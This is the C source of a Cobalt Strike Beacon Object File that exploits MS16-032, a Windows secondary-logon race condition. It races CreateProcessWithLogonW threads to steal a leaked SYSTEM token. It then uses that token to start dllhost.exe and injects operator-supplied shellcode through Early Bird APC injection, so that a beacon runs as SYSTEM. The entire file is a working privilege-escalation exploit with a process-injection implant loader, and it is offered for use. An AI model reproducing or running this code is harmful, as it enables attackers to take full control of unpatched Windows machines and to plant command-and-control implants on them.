#include <windows.h>
#include "beacon.h"

/* ------------------------------------------------------------------ */
/*  NTSTATUS helpers                                                   */
/* ------------------------------------------------------------------ */

#ifndef NTSTATUS
#define NTSTATUS LONG
#endif

#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_TOO_SMALL     ((NTSTATUS)0xC0000023L)

#define SystemExtendedHandleInformation 64

#ifndef SECURITY_MANDATORY_SYSTEM_RID
#define SECURITY_MANDATORY_SYSTEM_RID 0x00004000
#endif

#define DESIRED_TOKEN_ACCESS \
    (TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | \
     TOKEN_ADJUST_PRIVILEGES | TOKEN_IMPERSONATION)

#define NUM_RACE_THREADS       10
#define MAX_EXPLOIT_ATTEMPTS   10
#define RACE_DURATION_MS       1500
#define THREAD_WAIT_TIMEOUT_MS 5000

/* ------------------------------------------------------------------ */
/*  Native structures (architecture-safe EX variants)                  */
/* ------------------------------------------------------------------ */

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID     Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG     GrantedAccess;
    USHORT    CreatorBackTraceIndex;
    USHORT    ObjectTypeIndex;
    ULONG     HandleAttributes;
    ULONG     Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct {
    HANDLE hStopEvent;
    LPWSTR lpCommandLine;
} RACE_THREAD_DATA;

typedef struct {
    ULONG_PTR* values;
    ULONG_PTR  count;
} TOKEN_HANDLE_SNAPSHOT;

typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength
);

/* ------------------------------------------------------------------ */
/*  Helpers                                                            */
/* ------------------------------------------------------------------ */

static int wcsstr_check(const wchar_t* haystack, const wchar_t* needle) {
    int i, j;
    for (i = 0; haystack[i] != L'\0'; i++) {
        for (j = 0; needle[j] != L'\0' && haystack[i + j] != L'\0'; j++) {
            if (haystack[i + j] != needle[j])
                break;
        }
        if (needle[j] == L'\0')
            return 1;
    }
    return 0;
}

static PSYSTEM_HANDLE_INFORMATION_EX QuerySystemHandles(fnNtQuerySystemInformation NtQSI) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    ULONG  size  = 0x200000;
    PSYSTEM_HANDLE_INFORMATION_EX pInfo = NULL;
    NTSTATUS status;

    do {
        pInfo = (PSYSTEM_HANDLE_INFORMATION_EX)KERNEL32$HeapAlloc(hHeap, 0, size);
        if (!pInfo) return NULL;

        status = NtQSI(SystemExtendedHandleInformation, pInfo, size, NULL);

        if (status == STATUS_INFO_LENGTH_MISMATCH ||
            status == STATUS_BUFFER_TOO_SMALL) {
            KERNEL32$HeapFree(hHeap, 0, pInfo);
            pInfo = NULL;
            size *= 2;
        }
    } while (status == STATUS_INFO_LENGTH_MISMATCH ||
             status == STATUS_BUFFER_TOO_SMALL);

    if (status != STATUS_SUCCESS) {
        if (pInfo) KERNEL32$HeapFree(hHeap, 0, pInfo);
        return NULL;
    }
    return pInfo;
}

/* ------------------------------------------------------------------ */
/*  Dynamic token type index resolution                                */
/*  Opens our own process token, finds it in the system handle table,  */
/*  and reads back whatever ObjectTypeIndex the kernel assigned to      */
/*  Token objects on this build.                                       */
/* ------------------------------------------------------------------ */

static USHORT ResolveTokenTypeIndex(fnNtQuerySystemInformation NtQSI) {
    HANDLE  hToken   = NULL;
    USHORT  typeIdx  = 0;
    DWORD   pid;
    ULONG_PTR i;
    PSYSTEM_HANDLE_INFORMATION_EX pInfo;

    if (!ADVAPI32$OpenProcessToken(
            KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return 0;

    pid   = KERNEL32$GetCurrentProcessId();
    pInfo = QuerySystemHandles(NtQSI);

    if (!pInfo) {
        KERNEL32$CloseHandle(hToken);
        return 0;
    }

    for (i = 0; i < pInfo->NumberOfHandles; i++) {
        if (pInfo->Handles[i].UniqueProcessId == (ULONG_PTR)pid &&
            pInfo->Handles[i].HandleValue     == (ULONG_PTR)hToken) {
            typeIdx = pInfo->Handles[i].ObjectTypeIndex;
            break;
        }
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pInfo);
    KERNEL32$CloseHandle(hToken);
    return typeIdx;
}

/* ------------------------------------------------------------------ */
/*  Handle snapshots — baseline / diff approach                        */
/* ------------------------------------------------------------------ */

static TOKEN_HANDLE_SNAPSHOT SnapshotTokenHandles(
    fnNtQuerySystemInformation NtQSI,
    DWORD  pid,
    USHORT tokenTypeIdx)
{
    TOKEN_HANDLE_SNAPSHOT snap;
    HANDLE    hHeap = KERNEL32$GetProcessHeap();
    ULONG_PTR i, count, idx;
    PSYSTEM_HANDLE_INFORMATION_EX pInfo;

    snap.values = NULL;
    snap.count  = 0;

    pInfo = QuerySystemHandles(NtQSI);
    if (!pInfo) return snap;

    count = 0;
    for (i = 0; i < pInfo->NumberOfHandles; i++) {
        if (pInfo->Handles[i].UniqueProcessId == (ULONG_PTR)pid &&
            pInfo->Handles[i].ObjectTypeIndex  == tokenTypeIdx)
            count++;
    }

    snap.values = (ULONG_PTR*)KERNEL32$HeapAlloc(
        hHeap, 0, (count + 1) * sizeof(ULONG_PTR));

    if (!snap.values) {
        KERNEL32$HeapFree(hHeap, 0, pInfo);
        return snap;
    }

    idx = 0;
    for (i = 0; i < pInfo->NumberOfHandles; i++) {
        if (pInfo->Handles[i].UniqueProcessId == (ULONG_PTR)pid &&
            pInfo->Handles[i].ObjectTypeIndex  == tokenTypeIdx) {
            snap.values[idx++] = pInfo->Handles[i].HandleValue;
        }
    }
    snap.count = count;

    KERNEL32$HeapFree(hHeap, 0, pInfo);
    return snap;
}

static BOOL IsHandleInSnapshot(ULONG_PTR hv, TOKEN_HANDLE_SNAPSHOT* snap) {
    ULONG_PTR i;
    for (i = 0; i < snap->count; i++) {
        if (snap->values[i] == hv) return TRUE;
    }
    return FALSE;
}

/* ------------------------------------------------------------------ */
/*  Token validation                                                   */
/*  Checks: primary type, SYSTEM SID, system-level integrity.          */
/* ------------------------------------------------------------------ */

static BOOL ValidateSystemToken(HANDLE hToken) {
    DWORD      retLen;
    BYTE       buf[512];
    TOKEN_TYPE tt;
    LPWSTR     sidStr = NULL;
    BOOL       isSys;
    BYTE       ilBuf[256];

    if (!ADVAPI32$GetTokenInformation(
            hToken, TokenType, &tt, sizeof(tt), &retLen))
        return FALSE;
    if (tt != TokenPrimary)
        return FALSE;

    if (!ADVAPI32$GetTokenInformation(
            hToken, TokenUser, buf, sizeof(buf), &retLen))
        return FALSE;

    if (!ADVAPI32$ConvertSidToStringSidW(
            ((TOKEN_USER*)buf)->User.Sid, &sidStr))
        return FALSE;

    isSys = wcsstr_check(sidStr, L"S-1-5-18");
    KERNEL32$LocalFree(sidStr);
    if (!isSys) return FALSE;

    if (ADVAPI32$GetTokenInformation(
            hToken, TokenIntegrityLevel, ilBuf, sizeof(ilBuf), &retLen)) {
        TOKEN_MANDATORY_LABEL* pLabel = (TOKEN_MANDATORY_LABEL*)ilBuf;
        SID*  pSid = (SID*)pLabel->Label.Sid;
        DWORD rid;
        if (pSid->SubAuthorityCount > 0) {
            rid = pSid->SubAuthority[pSid->SubAuthorityCount - 1];
            if (rid < SECURITY_MANDATORY_SYSTEM_RID)
                return FALSE;
        }
    }

    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  Privilege helper                                                   */
/* ------------------------------------------------------------------ */

static BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR privName) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$LookupPrivilegeValueW(NULL, privName, &luid))
        return FALSE;

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    return ADVAPI32$AdjustTokenPrivileges(
        hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
}

/* ------------------------------------------------------------------ */
/*  Race thread — spams CreateProcessWithLogonW until stop event       */
/* ------------------------------------------------------------------ */

static DWORD WINAPI RaceThread(LPVOID lpParam) {
    RACE_THREAD_DATA*    pData = (RACE_THREAD_DATA*)lpParam;
    STARTUPINFOW         si;
    PROCESS_INFORMATION  pi;

    MSVCRT$memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    while (KERNEL32$WaitForSingleObject(pData->hStopEvent, 0)
           != WAIT_OBJECT_0) {

        MSVCRT$memset(&pi, 0, sizeof(pi));

        ADVAPI32$CreateProcessWithLogonW(
            L"x", L"x", L"x",
            LOGON_NETCREDENTIALS_ONLY,
            NULL,
            pData->lpCommandLine,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi);

        if (pi.hProcess) {
            KERNEL32$TerminateProcess(pi.hProcess, 0);
            KERNEL32$CloseHandle(pi.hProcess);
            KERNEL32$CloseHandle(pi.hThread);
        }
    }

    return 0;
}

/* ------------------------------------------------------------------ */
/*  Diff before/after snapshots to find leaked SYSTEM tokens           */
/* ------------------------------------------------------------------ */

static HANDLE FindLeakedToken(
    fnNtQuerySystemInformation NtQSI,
    DWORD                      pid,
    USHORT                     tokenTypeIdx,
    TOKEN_HANDLE_SNAPSHOT*     baseline)
{
    HANDLE    hResult = NULL;
    ULONG_PTR i;
    TOKEN_HANDLE_SNAPSHOT after;

    after = SnapshotTokenHandles(NtQSI, pid, tokenTypeIdx);
    if (!after.values) return NULL;

    for (i = 0; i < after.count && !hResult; i++) {
        HANDLE hCandidate, hDup;

        if (IsHandleInSnapshot(after.values[i], baseline))
            continue;

        hCandidate = (HANDLE)after.values[i];
        hDup       = NULL;

        if (KERNEL32$DuplicateHandle(
                KERNEL32$GetCurrentProcess(), hCandidate,
                KERNEL32$GetCurrentProcess(), &hDup,
                DESIRED_TOKEN_ACCESS, FALSE, 0)) {

            if (ValidateSystemToken(hDup))
                hResult = hDup;
            else
                KERNEL32$CloseHandle(hDup);
        }
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, after.values);
    return hResult;
}

/* ------------------------------------------------------------------ */
/*  Beacon injection — Early Bird APC into a sacrificial process       */
/*  Uses RW->RX memory and QueueUserAPC (no CreateRemoteThread).      */
/* ------------------------------------------------------------------ */

static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
    STARTUPINFOW        si;
    PROCESS_INFORMATION pi;
    LPVOID   pRemote;
    SIZE_T   written;
    DWORD    oldProt;
    BOOL     created;
    BOOL     impersonating = FALSE;
    wchar_t  target[] = L"C:\\Windows\\System32\\dllhost.exe";

    MSVCRT$memset(&si, 0, sizeof(si));
    MSVCRT$memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    /* Method 1: CreateProcessWithTokenW (needs SeImpersonatePrivilege) */
    created = ADVAPI32$CreateProcessWithTokenW(
        hSystemToken, 0, NULL, target,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi);

    if (!created) {
        /* Method 2: impersonate SYSTEM, then CreateProcessAsUserW */
        if (ADVAPI32$ImpersonateLoggedOnUser(hSystemToken)) {
            impersonating = TRUE;
            created = ADVAPI32$CreateProcessAsUserW(
                hSystemToken, NULL, target, NULL, NULL, FALSE,
                CREATE_SUSPENDED | CREATE_NO_WINDOW,
                NULL, NULL, &si, &pi);
        }
    }

    if (impersonating)
        ADVAPI32$RevertToSelf();

    if (!created) {
        BeaconPrintf(CALLBACK_ERROR,
            "Cannot spawn SYSTEM process (need SeImpersonatePrivilege): %d",
            KERNEL32$GetLastError());
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Sacrificial process PID %d", pi.dwProcessId);

    /* Allocate RW */
    pRemote = KERNEL32$VirtualAllocEx(
        pi.hProcess, NULL, scLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pRemote) {
        BeaconPrintf(CALLBACK_ERROR,
            "VirtualAllocEx failed: %d", KERNEL32$GetLastError());
        goto fail;
    }

    /* Write shellcode */
    if (!KERNEL32$WriteProcessMemory(
            pi.hProcess, pRemote, sc, scLen, &written)) {
        BeaconPrintf(CALLBACK_ERROR,
            "WriteProcessMemory failed: %d", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
        goto fail;
    }

    /* Flip RW -> RX */
    if (!KERNEL32$VirtualProtectEx(
            pi.hProcess, pRemote, scLen,
            PAGE_EXECUTE_READ, &oldProt)) {
        BeaconPrintf(CALLBACK_ERROR,
            "VirtualProtectEx failed: %d", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
        goto fail;
    }

    /* Queue APC — fires during NtTestAlert before the entry point */
    if (!KERNEL32$QueueUserAPC((PAPCFUNC)pRemote, pi.hThread, 0)) {
        BeaconPrintf(CALLBACK_ERROR,
            "QueueUserAPC failed: %d", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
        goto fail;
    }

    /* Resume — APC executes, beacon starts */
    KERNEL32$ResumeThread(pi.hThread);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Beacon injected via APC");
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    return TRUE;

fail:
    KERNEL32$TerminateProcess(pi.hProcess, 0);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    return FALSE;
}

/* ------------------------------------------------------------------ */
/*  BOF entry point                                                    */
/* ------------------------------------------------------------------ */

void go(char* args, int len) {
    datap               parser;
    int                  scLen = 0;
    unsigned char*       sc;
    SYSTEM_INFO          sysInfo;
    USHORT               tokenTypeIdx;
    DWORD                pid;
    HANDLE               hStopEvent;
    HANDLE               hSystemToken = NULL;
    HANDLE               hHeap;
    HANDLE               hThreads[NUM_RACE_THREADS];
    HANDLE               hProcToken = NULL;
    HMODULE              hNtdll;
    fnNtQuerySystemInformation NtQSI;
    RACE_THREAD_DATA     tData;
    TOKEN_HANDLE_SNAPSHOT baseline;
    int                  attempt, i, numThreads;

    /* ---- Parse shellcode ---- */
    BeaconDataParse(&parser, args, len);
    sc = (unsigned char*)BeaconDataExtract(&parser, &scLen);

    if (!sc || scLen == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "No shellcode. Usage: ms16032_inject <listener>");
        return;
    }

    /* ---- Pre-flight: CPU count ---- */
    KERNEL32$GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        BeaconPrintf(CALLBACK_ERROR,
            "Exploit requires 2+ logical CPUs (found %d)",
            sysInfo.dwNumberOfProcessors);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] MS16-032 LPE | CPUs: %d | Shellcode: %d bytes",
        sysInfo.dwNumberOfProcessors, scLen);

    /* ---- Resolve ntdll functions ---- */
    hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    NtQSI  = (fnNtQuerySystemInformation)KERNEL32$GetProcAddress(
                 hNtdll, "NtQuerySystemInformation");

    if (!NtQSI) {
        BeaconPrintf(CALLBACK_ERROR,
            "Cannot resolve NtQuerySystemInformation");
        return;
    }

    /* ---- Resolve token type index dynamically ---- */
    tokenTypeIdx = ResolveTokenTypeIndex(NtQSI);
    if (tokenTypeIdx == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "Cannot resolve token object type index");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Token type index: %d", tokenTypeIdx);

    pid   = KERNEL32$GetCurrentProcessId();
    hHeap = KERNEL32$GetProcessHeap();

    /* ---- Create stop event for clean thread shutdown ---- */
    hStopEvent = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!hStopEvent) {
        BeaconPrintf(CALLBACK_ERROR, "CreateEvent failed");
        return;
    }

    tData.hStopEvent     = hStopEvent;
    tData.lpCommandLine  = L"C:\\Windows\\System32\\cmd.exe";

    /* ---- Exploitation loop ---- */
    for (attempt = 0; attempt < MAX_EXPLOIT_ATTEMPTS && !hSystemToken;
         attempt++) {

        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Attempt %d/%d", attempt + 1, MAX_EXPLOIT_ATTEMPTS);

        /* Baseline snapshot of token handles in our process */
        baseline = SnapshotTokenHandles(NtQSI, pid, tokenTypeIdx);
        if (!baseline.values) {
            BeaconPrintf(CALLBACK_ERROR, "Handle snapshot failed");
            continue;
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Baseline: %llu token handles — racing...",
            (unsigned long long)baseline.count);

        /* Start race threads */
        KERNEL32$ResetEvent(hStopEvent);
        numThreads = 0;
        for (i = 0; i < NUM_RACE_THREADS; i++) {
            HANDLE h = KERNEL32$CreateThread(
                NULL, 0, RaceThread, &tData, 0, NULL);
            if (h) hThreads[numThreads++] = h;
        }

        if (numThreads == 0) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to create race threads");
            KERNEL32$HeapFree(hHeap, 0, baseline.values);
            continue;
        }

        /* Let the race run */
        KERNEL32$Sleep(RACE_DURATION_MS);

        /* Clean shutdown */
        KERNEL32$SetEvent(hStopEvent);
        KERNEL32$WaitForMultipleObjects(
            numThreads, hThreads, TRUE, THREAD_WAIT_TIMEOUT_MS);

        for (i = 0; i < numThreads; i++)
            KERNEL32$CloseHandle(hThreads[i]);

        /* Diff snapshots — any new SYSTEM token handle? */
        hSystemToken = FindLeakedToken(
            NtQSI, pid, tokenTypeIdx, &baseline);

        KERNEL32$HeapFree(hHeap, 0, baseline.values);

        if (hSystemToken)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] SYSTEM token acquired!");
    }

    KERNEL32$CloseHandle(hStopEvent);

    if (!hSystemToken) {
        BeaconPrintf(CALLBACK_ERROR,
            "No SYSTEM token after %d attempts — target may be patched",
            MAX_EXPLOIT_ATTEMPTS);
        return;
    }

    /* ---- Best-effort: enable SeImpersonatePrivilege on own token ---- */
    if (ADVAPI32$OpenProcessToken(
            KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &hProcToken)) {
        EnableTokenPrivilege(hProcToken, L"SeImpersonatePrivilege");
        KERNEL32$CloseHandle(hProcToken);
    }

    /* ---- Inject beacon ---- */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Injecting beacon...");

    if (InjectBeacon(hSystemToken, sc, scLen))
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Exploit complete — beacon should check in shortly");
    else
        BeaconPrintf(CALLBACK_ERROR, "Injection failed");

    KERNEL32$CloseHandle(hSystemToken);
}
